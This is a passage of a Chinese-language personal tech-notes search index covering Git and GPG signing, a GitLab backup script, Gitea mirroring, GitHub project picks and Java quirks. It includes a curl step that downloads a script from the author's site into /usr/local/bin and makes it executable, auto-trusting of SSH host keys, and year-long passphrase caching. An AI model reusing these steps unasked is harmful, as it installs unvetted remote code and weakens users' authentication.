\u6ce8\u610f\u8fd9\u91cc\u90ae\u7bb1\u8981\u548cgit commit\u7528\u5230\u7684\u90ae\u7bb1\u4e00\u81f4</p>","text":""},{"location":"Git/#key-github","title":"\u5bfc\u51fakey\u7684\u516c\u94a5 \u5728github\u8bbe\u7f6e\u4e2d\u63d0\u4ea4 <pre><code>gpg2 --list-secret-keys --keyid-format LONG\n</code></pre> <p>\u5982\u4e0b\u8f93\u51fa\u4e2d\uff0c\u6211\u4eec\u9700\u8981\u7684\u662f3AA5C34371567BD2\u8fd9\u4e00\u4e32 \u5c31\u662fsec\u90a3\u4e00\u884c\u76844096R/\u540e\u9762\u7684\u4e1c\u897f</p> <pre><code>$ gpg2 --list-secret-keys --keyid-format LONG\n/Users/hubot/.gnupg/secring.gpg\n------------------------------------\nsec   4096R/3AA5C34371567BD2 2016-03-10 [expires: 2017-03-10]\nuid                          Hubot \nssb   4096R/42B317FD4BA89E7A 2016-03-10\n</code></pre> <p>\u7136\u540e\u5f97\u5230\u516c\u94a5\uff1a</p> <pre><code>gpg2 --armor --export 3AA5C34371567BD2\n</code></pre> <p>\u590d\u5236\u5c4f\u5e55\u4e0a\u8f93\u51fa\u7684\u4e00\u5927\u4e32\uff0c\u6253\u5f00\u4e0b\u9762\u7684\u7f51\u9875 \u7c98\u8d34\u63d0\u4ea4</p> <p>https://github.com/settings/gpg/new</p>","text":""},{"location":"Git/#gitgpg","title":"\u914d\u7f6egit\u4f7f\u7528gpg\u7b7e\u540d <p>\u544a\u8bc9git\u9ed8\u8ba4\u4f7f\u7528\u8fd9\u4e2akey\uff1a</p> <pre><code>git config --global user.signingkey 3AA5C34371567BD2\ngit config --global commit.gpgsign true\n</code></pre> <p>\u6267\u884c \u5efa\u8bae\u5c06\u8fd9\u4e00\u884c\u5199\u5165~/.bashrc\uff1a</p> <pre><code>export GPG_TTY=$(tty)\n</code></pre> <p>\u7136\u540e\u5c31\u662f\u6b63\u5e38\u7684git add .\uff0cgit commit -m \u201cmessage\u201d\u54af</p> <p>gpg-agent\u4f1a\u5728\u540e\u53f0\u8fd0\u884c\uff0c\u9ed8\u8ba410\u5206\u949f\u5185\u4e0d\u9700\u8981\u518d\u6b21\u8f93\u5165\u5bc6\u7801</p>","text":""},{"location":"Git/#gpg","title":"\u4fee\u6539gpg\u8981\u6c42\u518d\u6b21\u8f93\u5165\u5bc6\u7801\u7684\u65f6\u95f4\u9650\u5236 <p>10\u5206\u949f\u7684\u9ed8\u8ba4\u9650\u5236\u8fd8\u662f\u592a\u77ed\u4e86\uff0c\u5bf9\u4e8e\u5b89\u5168\u6027\u8981\u6c42\u4e0d\u9ad8\u7684\u60c5\u666f\uff08\u6bd4\u5982\u81ea\u5df1\u7684\u5f00\u6e90\u4ee3\u7801push\u5230github\uff09\uff0c\u4e0d\u59a8\u8bbe\u7f6e\u4e3a\u5bc6\u7801\u4e00\u76f4\u6709\u6548\uff0c\u76f4\u5230gpg-agent\u91cd\u542f</p> <p>\u4e0b\u9762\u7684\u8bbe\u7f6e\u5c06\u9650\u5236\u6539\u52301\u5e74\uff0c\u5f53\u7136gpg-agent\u91cd\u542f\u8fd8\u662f\u8981\u518d\u6b21\u8f93\u5165\u5bc6\u7801\u7684\uff1a</p> <pre><code>vi ~/.gnupg/gpg-agent.conf\n\ndefault-cache-ttl 34560000\nmax-cache-ttl 34560000\n</code></pre>","text":""},{"location":"Git/#gitlab-api","title":"\u4f7f\u7528GitLab API\u5b58\u50a8\u6570\u636e\u5907\u4efd\u6587\u4ef6 \u4e0d\u5360\u7528\u672c\u5730\u7a7a\u95f4","text":"<p>\u8fd9\u91cc\u7684\u9700\u6c42\u662f\u5b9a\u65f6\u4efb\u52a1\u751f\u6210snapshot\u6587\u4ef6\uff0c\u6253\u7b97\u4f20\u81f3\u514d\u8d39\u5b58\u50a8\u4f5c\u4e3a\u5907\u4efd\uff0c\u4e0d\u60f3\u5360\u7528\u670d\u52a1\u5668\u786c\u76d8\u53bb\u5b58\u50a8\u8fd9\u4e2a\u6587\u4ef6\uff0c\u4e5f\u4e0d\u60f3\u82b1\u94b1\u4e70\u5b58\u50a8\u670d\u52a1</p> <p>\u4e8e\u662f\u60f3\u5230\u514d\u8d39\u7684gitlab.com\u7684\u79c1\u6709\u4ed3\u5e93\uff0c\u4ed3\u5e93\u6570\u91cf\u65e0\u9650\uff0c\u6bcf\u4e2arepo\u53ef\u4ee5\u5b5810GB</p> <p>\u4f7f\u7528API\u6765\u63d0\u4ea4\u53ef\u4ee5\u907f\u514d\u5360\u7528\u672c\u5730\u7a7a\u95f4</p> <p>\u5176\u5b9e\u672c\u6765\u6253\u7b97\u7528github\u7684\uff0c\u4f46\u662fgithub\u4eca\u5929(20181022)\u6302\u4e86\uff0c\u4e8e\u662f\u5c31gitlab\u5427</p> <p>\u627e\u5230\u8fd9\u4e2apython sdk: https://python-gitlab.readthedocs.io/</p> <p>\u5199\u70b9\u4ee3\u7801\u54af\uff1a\u4e0a\u4f20\u5f53\u524d\u76ee\u5f55\u7684to_upload.jpg\u5230uploaded.jpg\uff0c\u8bb0\u5f97\u76f8\u5e94\u4fee\u6539\u4f60\u7684\u8bbf\u95ee\u4ee4\u724c\u548c\u9879\u76eeID</p> <pre><code>TOKEN = '...' # personal access token, https://gitlab.com/profile/personal_access_tokens\nREPO_ID = 123456 # after create project, you can see project ID in your repo homepage\nmessage = 'test commit'\ntarget_filename = 'uploaded.jpg'\nsrc_filename = 'to_upload.jpg'\n\nimport gitlab\nimport base64\ngl=gitlab.Gitlab('https://gitlab.com',private_token=TOKEN)\ngl.auth()\np=gl.projects.get(REPO_ID)\nfilecontent = open(src_filename, 'rb').read()\ndata={\n    'branch_name':'master', \n    'branch':'master', \n    'commit_message':message,\n    'actions':[{'action':'create','file_path':target_filename,\n                'content':base64.b64encode(filecontent).decode(),\n                'encoding': 'base64'}]\n}\nc=p.commits.create(data)\nprint(c)\n</code></pre>"},{"location":"Git/#gitgit-pull","title":"\u5728git\u670d\u52a1\u5668\u65e0\u6cd5\u8fde\u63a5\u65f6\u70b9\u5bf9\u70b9git pull","text":"<p>\u60c5\u666f\uff1a\u5ba2\u6237\u7aefA\u548cB\u4f7f\u7528gitlab\u670d\u52a1\u5668S\uff0c\u7136\u540e\u67d0\u5929S\u65e0\u6cd5\u8fde\u4e0a\u4e86\uff0c\u4f46A\u548cB\u4e4b\u95f4\u53ef\u4ee5\u76f4\u63a5\u901a\u8baf\u3002B\u4e0a\u5f00\u53d1\u4e86\u65b0\u4ee3\u7801\uff0c\u60f3\u8ba9A\u83b7\u53d6\u5230\u8fd9\u4e2a\u66f4\u65b0\uff0c\u5982\u4f55\u6700\u65b9\u4fbf\u7b80\u5355\u5730\u5728A\u4e0a\u540c\u6b65B\u4e0a\u7684\u4ee3\u7801\u66f4\u65b0\u5462\uff1f</p> <p>\u89e3\u51b3\u65b9\u6848\uff1a\u7528python\u5f00\u4e2a\u7b80\u5355\u7684http\u670d\u52a1\u5668\u7136\u540e\u6dfb\u52a0http\u7684remote\u8fdb\u884cpull\uff0c\u6ce8\u610f\u5148\u8981\u8ba9git\u89e3\u538bpack\u6587\u4ef6</p> <pre><code>git update-server-info\npython3 -m http.server 6666\ngit remote add tmp http://ip-b:6666/.git/\ngit pull tmp master\n</code></pre> <p>\u95ee\u9898\u6765\u4e86\uff1a\u5982\u679cA\u8bbf\u95ee\u4e0d\u4e86B\u600e\u4e48\u529e\u5462\uff1f\u901a\u8fc7<code>git format-patch HEAD~2..HEAD --stdout&gt;patchfile</code>\u751f\u6210patch\u6587\u4ef6\u518d\u53d1\u8fc7\u53bb<code>git am patchfile</code>\uff0c\u4f46\u8fd9\u6837\u53ef\u80fd\u4f1a\u6539\u53d8commit id</p>"},{"location":"Git/#git_2","title":"git\u7981\u7528\u538b\u7f29","text":"<p>\u5982\u4e8c\u8fdb\u5236\u7684\u4ed3\u5e93\u4e0d\u60f3\u4f7f\u7528\u538b\u7f29\uff0c\u53c2\u8003: https://stackoverflow.com/questions/11483288/how-to-disable-compression-in-git-server-side</p> <pre><code>git config --add core.bigFileThreshold 1\n</code></pre>"},{"location":"Git/#githubssh-key-ghclone","title":"GitHub\u4e0d\u540c\u4ed3\u5e93\u4f7f\u7528\u4e0d\u540cssh key: ghclone","text":"<p>GitHub\u8981\u6c42\u4e0d\u540c\u4ed3\u5e93\u7684deploy key\u4e0d\u540c\uff0c\u4f46ssh config\u53ea\u80fd\u4e3a\u4e00\u4e2aHost\u8bbe\u7f6e\u76f8\u540c\u7684key</p> <p>\u4ece\u8fd9\u91cc\u53d1\u73b0\u4e86\u4e00\u4e2atrick\uff1a<code>*.github.com</code>\u90fd\u662f\u53ef\u4ee5\u6b63\u5e38\u89e3\u6790\u5230github\u7684\uff0c\u8fd9\u6837\u5c31\u5f97\u5230\u4e86\u65e0\u6570\u4e2aHost</p> <p>\u5feb\u901f\u4f7f\u7528\uff1a</p> <pre><code>curl https://d.py3.io/ghclone &gt; /usr/local/bin/ghclone\nchmod +x /usr/local/bin/ghclone\nghclone user/repo\n</code></pre> <p>\u4f1a\u4e3a\u8fd9\u4e2arepo\u521b\u5efa\u4e00\u4e2assh key\u653e\u5728<code>~/.ssh</code>\u76ee\u5f55\u4e0b\uff0c\u540c\u65f6\u4fee\u6539<code>~/.ssh/config</code>\uff0c\u7136\u540e\u663e\u793a\u51fa\u516c\u94a5\uff0c\u9700\u8981\u624b\u52a8\u6dfb\u52a0\u5230github\uff0c\u6700\u540e\u56de\u8f66\u5c31\u4f1a\u5f00\u59cbgit clone</p> <p>Done.</p> <p>\u5982\u679c\u662f\u4e00\u4e2a\u5df2\u7ecf\u5b58\u5728\u7684\u4ed3\u5e93\uff0c\u6700\u540e\u4e00\u6b65\u4e0d\u7528\u56de\u8f66Ctrl+C\u540e:</p> <pre><code>git remote set-url origin git@{repo}.github.com:{user}/{repo}.git\n</code></pre>"},{"location":"Git/#git_3","title":"\u542f\u52a8\u4e00\u4e2a\u4e34\u65f6\u7684Git\u670d\u52a1\u5668 \u672c\u5730\u4e4b\u95f4\u540c\u6b65","text":"<p>\u573a\u666f\uff1a GitLab\u670d\u52a1\u5668\u5b95\u673a\u4e86\uff0c\u73b0\u5728\u9700\u8981\u540c\u6b65\u81ea\u5df1\u672c\u5730\u7684\u4fee\u6539\u5230\u670d\u52a1\u5668\u4e0a</p> <p>\u53c2\u8003\uff1a https://datagrok.org/git/git-serve/</p> <pre><code># \u81ea\u5df1\u673a\u5668\u4e0a\uff08\u6709\u66f4\u591acommit\u7684\uff09\ngit config --global alias.quickserve \"daemon --verbose --export-all --base-path=.git --reuseaddr --strict-paths .git/\"\ngit quickserve\n\n# \u670d\u52a1\u5668\u4e0a\uff08\u9700\u8981pull\u5f97\u5230commit\u7684\uff09\ngit remote add temp git://192.168.1.123/\ngit pull temp master\n</code></pre> <p>\u540c\u6b65\u5b8c\u6210\u540e\u5c31\u53ef\u4ee5Ctrl+C\u5173\u95edgit\u670d\u52a1\u4e86</p> <p>Note</p> <p>git\u672b\u5c3e\u7684/\u4e0d\u53ef\u7f3a\u7701\uff0c\u4e0d\u7136\u62a5\u9519fatal: No path specified. See \u2018man git-pull\u2019 for valid url syntax git pull\u7684\u5206\u652f\u540d\u79f0master\u4e5f\u4e0d\u80fd\u7701\u7565</p>"},{"location":"Git/#githubstar","title":"\u5907\u4efdGitHub\u4e0a\u81ea\u5df1star\u8fc7\u7684\u4ed3\u5e93","text":"<p>\u81ea\u4eceGitHub\u88ab\u5fae\u8f6f\u6536\u8d2d\u540e\uff0c\u4f3c\u4e4e\u5c31\u5d29\u5f97\u66f4\u9891\u7e41\u4e86\uff0c\u4e3a\u4e86\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\u4ecd\u7136\u80fd\u8bfb\u4ee3\u7801\uff0c\u4e0d\u59a8\u8dd1\u4e00\u4e0b\u5b9a\u65f6\u811a\u672c\uff0c\u81ea\u52a8pull\u6307\u5b9a\u4ed3\u5e93push\u5230\u5176\u4ed6git\u670d\u52a1\u4e0a\uff08\u5982\u81ea\u884c\u90e8\u7f72gitea\uff09\u3002</p> <p>\u83b7\u53d6\u81ea\u5df1star\u8fc7\u7684\u6240\u6709\u4ed3\u5e93\uff1a\uff08\u4f9d\u8d56<code>apt install -y jq</code>\uff09</p> <pre><code>for i in `seq 28`; do curl \"https://api.github.com/users/zjuchenyuan/starred?page=${i}\" &gt;${i}.tmp; done\ncat *.tmp |jq '.[].full_name' -r &gt; mystars.txt\n</code></pre> <p>sync.sh: </p> <p>\u4ecegithub clone\u6216fetch\u5bf9\u5e94\u7684\u4ed3\u5e93\uff0c\u7136\u540epush\u5230\u81ea\u5df1\u7684git\u670d\u52a1\u4e0a\uff0c\u8fd9\u91cc\u4f7f\u7528bare\u907f\u514dcheckout\u5bfc\u81f4\u7684\u66f4\u591a\u7a7a\u95f4\u5360\u7528</p> <p>TODO: \u6ce8\u610f\u5230\u4ecd\u7136\u662f\u53cc\u4efd\u7684\u7a7a\u95f4\u5360\u7528\uff08\u540c\u6b65\u548cgitea\u90fd\u5b58\u4e86\uff09\uff0c\u9700\u8981\u770b\u770b\u80fd\u4e0d\u80fd\u76f4\u63a5\u4ecegitea\u7684git\u5b58\u50a8\u53d1\u8d77fetch\u66f4\u65b0</p> <pre><code>#!/bin/bash\nu=`echo ${1}|cut -d/ -f1`\nn=`echo ${1}|cut -d/ -f2`\nif [ -z \"$u\" ] || [ -z \"$n\" ]; then\necho Usage: $0 user/reponame\n    exit 1\nfi\nif [ -d \"${u}_${n}\" ]; then\ncd \"${u}_${n}\"\ngit fetch --all\n    git push --all sync\nelse\ngit clone https://github.com/${u}/${n} \"${u}_${n}\" --bare\n    cd \"${u}_${n}\"\ngit fetch --all\n    git remote add sync git@\u4f60\u7684git\u670d\u52a1\u5730\u5740:\u4f60\u7684\u7528\u6237\u540d/${u}_${n}.git\n    git push --all sync\nfi\ncd ..\n</code></pre>"},{"location":"Git/#git-clonepushsshyes","title":"git clone\u548cpush\u907f\u514d\u8f93\u5165ssh\u8be2\u95ee\u7684yes","text":"<pre><code>mkdir -p ~/.ssh\nssh-keyscan \u4f60\u7684git\u670d\u52a1\u5730\u5740 &gt;&gt; ~/.ssh/known_host\n</code></pre> <p>Note</p> <p>\u8fd9\u4e2a\u65b9\u6848\u5e76\u4e0d\u5b89\u5168\uff0c\u5bb9\u6613\u906d\u53d7\u4e2d\u95f4\u4eba\u653b\u51fb\uff0c\u4f60\u5e94\u8be5\u4e8b\u5148\u5728\u5b89\u5168\u7684\u7f51\u7edc\u4e0b\u83b7\u53d6\u6b63\u786e\u7684ssh key\u540e\u76f4\u63a5\u5c06\u6307\u7eb9\u5199\u5165known_host\u3002 \u4e0d\u8fc7\u5c31\u7b97\u4e0d\u81ea\u52a8\u5316\u4f60\u4e5f\u4f1a\u81ea\u5df1\u56de\u7b54yes\uff0c\u672c\u8d28\u4e0a\u4e00\u6837hhh</p>"},{"location":"Git/#gitea","title":"\u90e8\u7f72gitea","text":"<p>https://hub.docker.com/r/gitea/gitea</p> <p>\u6309\u7167\u5b98\u65b9\u7ed9\u51fa\u7684docker-compose\u90e8\u7f72\u5373\u53ef\uff0c\u5b89\u88c5\u65f6\u9700\u8981\u7559\u5fc3\uff1asmtp\u7684host\u9700\u8981\u5305\u542b\u7aef\u53e3\uff0c\u767b\u5f55\u7528\u6237\u540d\u662f\u5b8c\u6574\u7684\u90ae\u7bb1</p> <p>\u7136\u540e\u9700\u8981\u4fee\u6539\u914d\u7f6e\uff0c\u5141\u8bb8\u7528\u6237\u5728push\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u4ed3\u5e93\u65f6\u81ea\u52a8\u521b\u5efa\uff0c\u53c2\u89c1\u8fd9\u4e2aissue \u548c conf\u914d\u7f6e\u6587\u6863</p> <p>\u9700\u8981\u5728app.ini\u7684<code>[repository]</code>\u4e00\u8282\u4e2d\u52a0\u5165\uff1a</p> <pre><code>ENABLE_PUSH_CREATE_USER = true\nENABLE_PUSH_CREATE_ORG = true\n</code></pre> <p>\u5c0f\u5fc3git bomb</p> <p>\u5b9e\u9645\u6d4b\u8bd5\u53d1\u73b0 \u5bf9git bomb\u8fd9\u79cd\u4ed3\u5e93 checkout\u5c31\u4f1a\u5360\u6ee1\u5168\u90e8\u5185\u5b58 \u5373\u4f7f\u4f7f\u7528\u4e0a\u8ff0\u811a\u672c\u53ea\u540c\u6b65bare\u4ed3\u5e93\uff0cgitea\u4f1a\u542f\u52a8git show\u547d\u4ee4\uff0c\u4ecd\u7136\u4f1a\u70b8\u5185\u5b58\uff08\u4f46\u4f3c\u4e4ekill\u6389\u8fd9\u4e2a\u547d\u4ee4\u540e\u7f51\u9875\u663e\u793a\u4e5f\u662f\u6b63\u5e38\u7684\uff09</p>"},{"location":"Git/#gitcommit","title":"Git\u67e5\u8be2\u7279\u5b9acommit\u65f6\u95f4","text":"<p>https://stackoverflow.com/questions/3814926/git-commit-date</p> <p>\u83b7\u53d6\u65f6\u95f4\u6233\uff1a<code>git show -s --format=%ct COMMIT_ID</code></p>"},{"location":"Git/#githubreleases","title":"GitHub\u67e5\u8be2\u6240\u6709releases","text":"<p>https://docs.github.com/en/rest/reference/repos#releases</p> <p>https://api.github.com/repos/octocat/hello-world/releases?per_page=100&amp;page=1</p>"},{"location":"Git/#git-diff","title":"git diff\u663e\u793a\u4fee\u6539\u540e\u884c\u53f7","text":"<p>\u53c2\u8003\uff1a https://stackoverflow.com/questions/8259851/using-git-diff-how-can-i-get-added-and-modified-lines-numbers</p> <pre><code>diff-lines() {\n    local path=\n    local line=\n    while read; do\n        esc=$'\\033'\n        if [[ $REPLY =~ ---\\ (a/)?.* ]]; then\n            continue\n        elif [[ $REPLY =~ \\+\\+\\+\\ (b/)?([^[:blank:]$esc]+).* ]]; then\n            path=${BASH_REMATCH[2]}\nelif [[ $REPLY =~ @@\\ -[0-9]+(,[0-9]+)?\\ \\+([0-9]+)(,[0-9]+)?\\ @@.* ]]; then\n            line=${BASH_REMATCH[2]}\nelif [[ $REPLY =~ ^($esc\\[[0-9;]+m)*([\\ +-]) ]]; then\n            echo \"$path:$line:$REPLY\"\n            if [[ ${BASH_REMATCH[2]} != - ]]; then\n                ((line++))\n            fi\n        fi\n    done\n}\n</code></pre> <p>\u7528\u6cd5\uff1a<code>git diff commit^ commit -U0|diff-lines</code></p>"},{"location":"Git/#gittagcommit","title":"git\u5bfc\u51fatag\u4e0ecommit\u5173\u7cfb","text":"<p>\u6709\u4e9b\u65f6\u5019\u9700\u8981\u5c06commit\u7ffb\u8bd1\u6210\u5bf9\u5e94\u7684tag\uff0c\u53ef\u4ee5\u5148\u8fd9\u6837\u5bfc\u51fa\u518d\u67e5\u8be2\uff1a</p> <pre><code>git tag|while read i; do echo ${i} `git log -1 --format='%H' ${i}`; done &gt; tags.txt\n</code></pre> <p>\u867d\u7136git tag\u4e5f\u6709<code>--format</code>\u53c2\u6570\uff0c\u4f46\u6ca1\u627e\u5230\u53ef\u4ee5\u663e\u793atag\u5bf9\u5e94commit\u7684\u65b9\u6cd5\uff0c\u90a3\u5c31\u8fd8\u662f\u8001\u8001\u5b9e\u5b9egit log\u5457</p>"},{"location":"GithubProjectRecommendation/","title":"Github Project Recommendation","text":""},{"location":"GithubProjectRecommendation/#you-get","title":"you-get","text":"<p>https://github.com/soimort/you-get</p> <p>pip\u5b89\u88c5\u540e\u76f4\u63a5\u4e0b\u8f7db\u7ad9\u8d85\u6e05\u89c6\u9891</p> <p>\u672c\u60f3\u81ea\u5df1\u7528PhantomJS\u5199bilibili\u7684\u4e0b\u8f7d\u7684\uff0c\u6ca1\u60f3\u5230\u4eba\u5bb6\u62ff\u5230\u4e86\u7b7e\u540d\u7684\u79c1\u94a5\uff0c\u76f4\u63a5\u514d\u6d4f\u89c8\u5668\u5b9e\u73b0\u4e86666</p>"},{"location":"GithubProjectRecommendation/#anki","title":"Anki","text":"<p>https://github.com/dae/anki</p> <p>Anki\u662f\u4e00\u4e2a\u8f85\u52a9\u8bb0\u5fc6\u8f6f\u4ef6\uff0c\u5b83\u53ef\u4ee5\u5728\u76f8\u5bf9\u5408\u9002\u7684\u65f6\u95f4\u6765\u544a\u8bc9\u4f60\u590d\u4e60\u4ec0\u4e48\u6bd4\u8f83\u597d\u3002</p> <p>Learn More:</p> <p>https://zhuanlan.zhihu.com/p/21338255?refer=-anki</p> <p>https://zhuanlan.zhihu.com/-anki</p>"},{"location":"GithubProjectRecommendation/#onlinejudge","title":"OnlineJudge","text":"<p>https://github.com/QingdaoU/OnlineJudge</p> <p>\u9752\u5c9b\u5927\u5b66\u7684OnlineJudge\uff0c\u4eba\u5bb6\u7684\u6bd5\u4e1a\u8bbe\u8ba1\u5462\uff0c\u754c\u9762\u597d\u770b\uff0c\u57fa\u4e8eDocker\uff0cC\u548cJava\u7684\u6c99\u7bb1\u8bbe\u8ba1\u633a\u5b8c\u5584\u7684</p> <p>https://github.com/QingdaoU/OnlineJudge/wiki/%E6%AD%A3%E5%BC%8F%E9%83%A8%E7%BD%B2%E6%96%87%E6%A1%A3</p> <p>\u8fd9\u662f\u5b89\u88c5\u6587\u6863\uff0c\u9700\u8981\u5b89\u88c5Docker\u548cdocker-compose\uff0c\u6ce8\u610f\u5176\u4e2dpython tools/release_static.py\u8fd9\u4e00\u6b65\u662f\u5fc5\u987b\u6267\u884c\u7684</p> <p>\u5b89\u88c5\u540e\u7684\u9ed8\u8ba4\u7248\u672c\u662f\u4e0d\u652f\u6301Python\u4f5c\u4e3a\u63d0\u4ea4\u8bed\u8a00\u7684\uff0c\u9700\u8981\u8fdb\u884c\u5982\u4e0b\u64cd\u4f5c\uff1a</p> <pre><code># \u9996\u5148\u5173\u6389\u5bb9\u5668\ndocker-compose stop\n# \u5728master\u5206\u652f\u628a\u90a3\u4e2a\u5206\u652fmerge\u8fc7\u6765\ngit merge origin/python-support\npython tools/release_static.py\n# \u7136\u540e\u542f\u52a8\u5bb9\u5668\uff0c\u6ce8\u610f\u8981-d\u5426\u5219\u4f1a\u5360\u636e\u524d\u53f0\ndocker-compose up -d\n</code></pre>"},{"location":"GithubProjectRecommendation/#sympy","title":"sympy","text":"<p>https://github.com/sympy/sympy</p> <p>http://docs.sympy.org/latest/tutorial/solvers.html</p> <p>Python\u4e5f\u80fd\u7528\u6765\u89e3\u65b9\u7a0b\uff01\u6c42\u6781\u9650\uff01\u6c42\u79ef\u5206\uff01</p>"},{"location":"GithubProjectRecommendation/#shellcheck","title":"shellcheck","text":"<p>\u68c0\u67e5\u81ea\u5df1\u5199\u7684shell\u811a\u672c\u6709\u6ca1\u6709\u95ee\u9898</p> <p>https://github.com/koalaman/shellcheck</p> <p>https://www.shellcheck.net/</p>"},{"location":"GithubProjectRecommendation/#instantclick","title":"InstantClick","text":"<p>https://github.com/dieulot/instantclick</p> <p>\u5728\u9f20\u6807\u60ac\u505c\u65f6\u5373\u523b\u5f00\u59cb\u52a0\u8f7d\u7f51\u9875\uff0c\u663e\u8457\u63d0\u9ad8\u7f51\u9875\u52a0\u8f7d\u901f\u5ea6\uff0c\u975e\u5e38\u9002\u5408\u9759\u6001blog\u7c7b\u578b\u7f51\u9875\u4f7f\u7528</p>"},{"location":"GithubProjectRecommendation/#explainshell","title":"explainshell","text":"<p>https://github.com/idank/explainshell</p> <p>\u67e5\u8be2shell\u547d\u4ee4\u5404\u4e2a\u53c2\u6570\u7684\u542b\u4e49</p>"},{"location":"GithubProjectRecommendation/#python-learn-notes","title":"Python Learn Notes","text":"<p>https://github.com/AnyISalIn/Python_Learn_Notes</p> <p>\u4e00\u4e9b\u4e0d\u9519\u7684Python\u7b14\u8bb0</p>"},{"location":"GithubProjectRecommendation/#websocketd","title":"websocketd","text":"<p>https://github.com/joewalnes/websocketd/</p> <p>\u628alinux\u7a0b\u5e8f\u7684\u8f93\u51fa\u8f93\u51fa\u91cd\u5b9a\u5411\u5230websocket\uff0c\u5c31\u53ef\u4ee5\u5b9e\u73b0\u7f51\u9875\u4e0a\u5b9e\u65f6\u663e\u793a\u7a0b\u5e8f\u6267\u884c\u52a8\u6001\uff0c\u5b98\u7f51\uff1ahttp://websocketd.com/</p>"},{"location":"Java/","title":"Java","text":""},{"location":"Java/#javakeng","title":"Java\u7684\u795e\u5947(keng)","text":"<p>\u8bb0\u5f55\u4e00\u4e0bJava\u4e0eC\u7684\u4e0d\u540c\u70b9\uff0c\u611f\u53d7Thinking in Java</p>"},{"location":"Java/#_1","title":"\u53d8\u91cf\u540d\u79f0","text":"<p>$\u5c31\u662f\u4e2a\u666e\u901a\u5b57\u7b26\uff0c\u53ef\u4ee5int $a; //php\u8868\u793amdzz</p>"},{"location":"Java/#main","title":"main\u51fd\u6570","text":"<p>\u5fc5\u987b\u662fpublic static void main(String[] args)</p> <p>\u5982\u679c\u6ca1\u6709static\uff0c\u7f16\u8bd1\u80fd\u901a\u8fc7\u4f46\u6ca1\u6709\u6267\u884c\u7ed3\u679c\uff1f// \u5f85\u8003\u8bc1\uff0ceclipse\u62d2\u7edd\u8fd0\u884c</p>"},{"location":"Java/#if","title":"if","text":"<p>if\u4e2d\u7684\u4e1c\u897f\u5fc5\u987b\u662fboolean\u7c7b\u578b\u7684\u503c\uff0c\u4e0d\u80fd\u628aint\u653e\u5165if\u4e2d</p> <p>if ( a = true )\u7684\u5751\u8fd8\u662f\u5b58\u5728\u7684\uff0c\u5141\u8bb8\u8d4b\u503c\u4f5c\u4e3aif\u6761\u4ef6</p>"},{"location":"Java/#_2","title":"%\u53d6\u4f59\u7684\u7ed3\u679c","text":"<p>\u8981\u8003\u8651\u5230\u8d1f\u6570\u7684\u7ed3\u679c\u554a~\uff08\u548cC\u4e00\u81f4\uff09</p>"},{"location":"Java/#_3","title":"\u6570\u7ec4\u58f0\u660e\u5f15\u7528\u3001\u521d\u59cb\u5316\u4e4b\u540e\u624d\u80fd\u7528","text":"<p>\u4e0d\u5141\u8bb8int a[5]; \u53ea\u80fdint[] a = new int [5];</p> <p>\u5982\u679c\u8981\u521d\u59cb\u5316 int[] b = new int[]{1,2}; \u53ef\u4ee5\u7b80\u5316\u4e3a int c[] = {1,2};</p> <p>\u4f46\u4e0d\u80fd\u51fa\u73b0d={1,2}; \u4e0d\u5141\u8bb8\u5927\u62ec\u53f7\u8fd9\u73a9\u610f\u7528\u6765\u8d4b\u503c\uff0c\u53ea\u51c6\u7528\u4e8e\u521d\u59cb\u5316</p>"},{"location":"Java/#switch","title":"switch","text":"<p>boolean\u662f\u4e0d\u884c\u7684\uff1bString\u662f\u53ef\u4ee5\u7684\uff01</p> <p>case\u662f\u4e0d\u80fd\u91cd\u590d\u7684\uff08\u548cC\u4e00\u81f4\uff09</p>"},{"location":"Java/#_4","title":"==","text":"<p>\u4e00\u5b9a\u662f\u6bd4\u8f83\u5730\u5740\uff0c\u5982\u679c\u201dhaha\u201d\u5728\u4ee3\u7801\u4e2d\u51fa\u73b0\u4e24\u6b21\uff0c\u4ed6\u4eec\u7684\u5730\u5740\u662f\u4e00\u6837\u7684</p>"},{"location":"Java/#_5","title":"\u7c7b\u578b\u81ea\u52a8\u63d0\u5347","text":"<p>int long float double</p> <p>\u6700\u9ad8\u51fa\u73b0\u54ea\u4e2a\u5168\u90e8\u63d0\u5347\u4e3a\u54ea\u4e2a\uff0c\u90fd\u6ca1\u6709\u5c31\u5168\u90e8\u63d0\u5347\u4e3aint</p> <p>\u6240\u4ee5\u8981\u8fd9\u4e48\u5199\u624d\u80fd\u628abyte2\uff1abyte b = (byte)(a2);</p>"},{"location":"Java/#_6","title":"\u5185\u90e8\u7c7b","text":"<p>\u52a0\u4e0astatic\u540e\uff1a\u53ef\u4ee5\u4e0d\u7528\u5b9e\u4f8b\u5316\u5916\u90e8\u7c7b\u5c31\u521b\u5efa\u5bf9\u8c61\uff0c\u4e0d\u80fd\u8bbf\u95ee\u5916\u90e8\u7c7b\u975e\u9759\u6001\u7684\u6570\u636e</p> <p>\u4e0d\u52a0static\uff1a\u9700\u8981\u5148\u5b9e\u4f8b\u5316\u5916\u90e8\u7c7bnew OuterClass().new InnerClass()</p>"},{"location":"Java/#new","title":"\u6570\u7ec4\u7684new\u4e0d\u521b\u5efa\u5bf9\u8c61","text":"<p>\u5bf9\u8c61\u6570\u7ec4\u7684new\u662f\u4e0d\u4f1a\u521b\u5efa\u5bf9\u8c61\u7684</p> <p>\u4f8b\u5982 <code>A[] a=new A[5];</code> \u5e76\u4e0d\u4f1a\u521b\u5efa5\u4e2aA\u7c7b\u578b\u7684\u5bf9\u8c61\uff0c\u53ea\u662f5\u4e2a\u7a7a\u5f15\u7528</p>"},{"location":"Java/#_7","title":"\u5f02\u5e38\u5904\u7406\u4e2d\u7684\u8d44\u6e90\u91ca\u653e\u95ee\u9898","text":"<p>From: http://stackoverflow.com/questions/8080649/do-i-have-to-close-fileoutputstream-which-is-wrapped-by-printstream</p> <p>\u5728Java7\u4e2d\u5f15\u5165\u4e86ARM(\u81ea\u52a8\u8d44\u6e90\u7ba1\u7406)\uff0c\u5e76\u4e0d\u9700\u8981\u624b\u52a8\u91ca\u653e\u8d44\u6e90</p> <p>\u4ee5\u4e0b\u8fd9\u79cd\u628a\u53d8\u91cf\u58f0\u660e\u653e\u5230try\u540e\u7684\u62ec\u53f7\u91cc\u9762\uff0c\u4e0d\u5bf9\u8d44\u6e90\u624b\u52a8\u91ca\u653e\u7684\u5199\u6cd5\u662f\u53ef\u4ee5\u7684\uff0c\u6ca1\u6709\u4efb\u4f55\u9519\u8bef</p> <pre><code>public static void main(String args[]) throws IOException { try (PrintStream ps = new PrintStream(new FileOutputStream(\"myfile.txt\"))) 